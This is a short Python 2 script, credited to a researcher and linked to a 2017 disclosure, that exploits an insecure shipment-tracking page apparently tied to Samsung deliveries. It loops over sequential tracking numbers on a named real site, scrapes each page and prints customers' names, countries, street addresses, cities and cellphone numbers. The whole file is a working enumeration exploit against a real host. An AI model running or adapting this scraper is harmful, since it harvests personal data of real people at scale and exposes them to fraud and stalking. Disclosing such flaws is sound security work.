'''
Salvador Mendoza (www.salmg.net)
March 17, 2017
Exploiting the Samsung Leaking Customer Information
Details about the flaw: https://hackernoon.com/samsung-leaking-customer-information-9b7e2dcb006d#.q75hkmh6q
'''
from BeautifulSoup import BeautifulSoup
from re import IGNORECASE, search
from mechanize import Browser
from optparse import OptionParser
from time import sleep

iniCounter = 2350000 #Pages Range: 2350000 -> 5350000
lastCounter = 5350000
typeSearch = None
iniSearch = 'http://tracking.agsystems.com/showtracking.asp?hawb='

def getPage(url, sSearch):
    print url
    browser = Browser()
    page = browser.open(url)
    source_code = page.read()
    searchPage(source_code, sSearch)

def searchPage(table, s1):
    soup = BeautifulSoup(table)
    getData = soup('font', face="verdana",size="2")
    text = str(getData)
    if search(s1, text, IGNORECASE):
        # 0 = name
        # 2 = country
        # 4 = street
        # 8 = city
        # 10 = cellphone
        dataC = 0
        while dataC<=10:
            if dataC != 6:
                print str(getData[1].contents[dataC]).strip()
            dataC = dataC + 2

def main():
    parser = OptionParser('usage %prog ' +\
      '-t <string to be search>' ' -c <#\'s records to be search>')
    parser.add_option('-c', dest='counter', type='string',\
      help='specify how many urls')
    parser.add_option('-t', dest='types', type='string',\
      help='string to search for')
    parser.add_option('-d', dest='delays', type='string',\
      help='delay the search in seconds')
    (options, args) = parser.parse_args()
    
    manySearch = options.counter
    typeSearch = options.types
    delaySearch = options.delays
    if manySearch == None or typeSearch == None:
        print parser.usage
        exit(0)
    else:
        toRange = iniCounter + int(manySearch)
        if toRange > lastCounter or toRange < 0:
            print "maximum registers: 3,000,000; give a smaller number for -c"
            exit(0)
        else:
            for x in range(iniCounter, toRange):
                getPage(iniSearch + str(x), typeSearch)
                if delaySearch:
                    sleep(int(delaySearch))

if __name__ == '__main__':
    main()
